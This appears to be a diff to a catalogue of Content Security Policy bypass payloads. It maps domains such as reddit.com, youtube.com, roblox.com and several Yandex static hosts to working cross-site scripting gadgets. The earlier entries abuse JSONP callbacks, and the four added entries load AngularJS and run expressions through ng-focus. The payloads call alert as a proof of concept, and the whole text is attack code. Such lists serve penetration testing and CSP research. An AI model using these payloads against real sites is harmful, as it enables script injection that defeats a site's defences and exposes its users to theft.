@@ -83,3 +83,7 @@ www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></
 www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{assetId:1}]&jsoncallback=alert"></script>
 www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>
 yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+yastat.net	<body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+yastatic.net	<body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.yastat.net	<body ng-app ng-csp><script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.yastatic.net	<body ng-app ng-csp><script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
